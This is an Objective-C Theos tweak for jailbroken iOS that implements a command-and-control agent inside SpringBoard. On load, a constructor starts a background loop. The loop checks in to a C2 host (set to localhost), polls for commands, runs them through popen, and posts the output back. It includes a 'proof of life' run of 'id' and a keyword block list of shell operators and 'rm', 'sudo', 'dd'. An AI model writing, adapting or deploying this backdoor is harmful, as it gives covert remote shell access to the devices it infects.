// SpringBoardTweak.m
#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>

// ============ 配置 ============
#define C2_HOST @"http://localhost:8888"
#define C2_INTERVAL 3.0

// ============ 全局变量 ============
static NSString *deviceId = nil;
static BOOL running = YES;

// ============ URL编码 ============
NSString *urlEncode(NSString *s) {
    return [s stringByAddingPercentEncodingWithAllowedCharacters:
            [NSCharacterSet URLQueryAllowedCharacterSet]] ?: @"";
}

// ============ HTTP GET ============
NSData *httpGet(NSString *path) {
    NSString *urlStr = [C2_HOST stringByAppendingString:path];
    NSURL *url = [NSURL URLWithString:urlStr];
    if (!url) return nil;
    
    NSURLRequest *req = [NSURLRequest requestWithURL:url
                         cachePolicy:NSURLRequestReloadIgnoringCacheData
                         timeoutInterval:10];
    
    __block NSData *result = nil;
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    
    [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(
        NSData *data, NSURLResponse *resp, NSError *err) {
        result = data;
        dispatch_semaphore_signal(sem);
    }] resume];
    
    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 10 * NSEC_PER_SEC));
    return result;
}

// ============ HTTP POST ============
NSData *httpPost(NSString *path, NSDictionary *body) {
    NSString *urlStr = [C2_HOST stringByAppendingString:path];
    NSURL *url = [NSURL URLWithString:urlStr];
    if (!url) return nil;
    
    NSData *json = [NSJSONSerialization dataWithJSONObject:body options:0 error:nil];
    if (!json) return nil;
    
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
    req.HTTPMethod = @"POST";
    req.HTTPBody = json;
    [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    req.timeoutInterval = 10;
    
    __block NSData *result = nil;
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    
    [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(
        NSData *data, NSURLResponse *resp, NSError *err) {
        result = data;
        dispatch_semaphore_signal(sem);
    }] resume];
    
    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 10 * NSEC_PER_SEC));
    return result;
}

// ============ 获取设备ID ============
NSString *getDeviceId() {
    if (deviceId) return deviceId;
    
    // 读取缓存
    NSString *cachePath = @"/tmp/.test_c2";
    deviceId = [NSString stringWithContentsOfFile:cachePath encoding:NSUTF8StringEncoding error:nil];
    if (deviceId) return deviceId;
    
    // 生成新ID
    NSString *uuid = [[[UIDevice currentDevice] identifierForVendor] UUIDString] ?: @"unknown";
    deviceId = [NSString stringWithFormat:@"test_%@", uuid];
    [deviceId writeToFile:cachePath atomically:YES encoding:NSUTF8StringEncoding error:nil];
    
    return deviceId;
}

// ============ 执行命令（使用popen，iOS兼容）============
NSString *executeCommand(NSString *cmd) {
    if (!cmd || cmd.length == 0) return @"";
    
    // 安全检查
    NSArray *dangerous = @[@"|", @";", @"&&", @"`", @"$(", @"rm ", @"sudo", @"dd "];
    for (NSString *d in dangerous) {
        if ([cmd containsString:d]) {
            return @"[REJECTED] Dangerous command";
        }
    }
    
    FILE *fp = popen([cmd UTF8String], "r");
    if (!fp) return @"popen failed";
    
    NSMutableString *out = [NSMutableString string];
    char buf[4096];
    int total = 0;
    
    while (fgets(buf, sizeof(buf), fp)) {
        total += strlen(buf);
        if (total > 1024 * 512) {
            [out appendString:@"\n... truncated"];
            break;
        }
        [out appendFormat:@"%s", buf];
    }
    
    int rc = pclose(fp);
    [out appendFormat:@"\n[exit: %d]", rc];
    return out.length > 0 ? out : @"(no output)";
}

// ============ 签到 ============
void checkin() {
    NSString *path = [NSString stringWithFormat:@"/api/checkin?id=%@&v=%@&proc=%@&pid=%d",
                     urlEncode(getDeviceId()),
                     urlEncode([[UIDevice currentDevice] systemVersion] ?: @"?"),
                     urlEncode(@"SpringBoard"),
                     getpid()];
    httpGet(path);
}

// ============ 轮询命令 ============
void pollCommands() {
    NSString *path = [NSString stringWithFormat:@"/api/commands?id=%@", urlEncode(getDeviceId())];
    NSData *data = httpGet(path);
    if (!data) return;
    
    NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
    if (!json) return;
    
    NSArray *commands = json[@"commands"];
    if (!commands || commands.count == 0) return;
    
    for (NSDictionary *cmd in commands) {
        NSString *cmdId = cmd[@"id"] ?: @"?";
        NSString *cmdText = cmd[@"cmd"];
        if (!cmdText) continue;
        
        NSString *output = executeCommand(cmdText);
        
        httpPost(@"/api/result", @{
            @"id": getDeviceId(),
            @"cmd_id": cmdId,
            @"output": output
        });
    }
}

// ============ 主循环 ============
void agentLoop() {
    checkin();
    
    // Proof of life
    NSString *pol = executeCommand(@"id");
    httpPost(@"/api/result", @{
        @"id": getDeviceId(),
        @"cmd_id": @"proof_of_life",
        @"output": pol
    });
    
    while (running) {
        @autoreleasepool {
            pollCommands();
        }
        [NSThread sleepForTimeInterval:C2_INTERVAL];
    }
}

// ============ 使用Theos的%ctor入口 ============
%ctor {
    @autoreleasepool {
        // 在后台线程运行C2代理
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
            agentLoop();
        });
    }
}
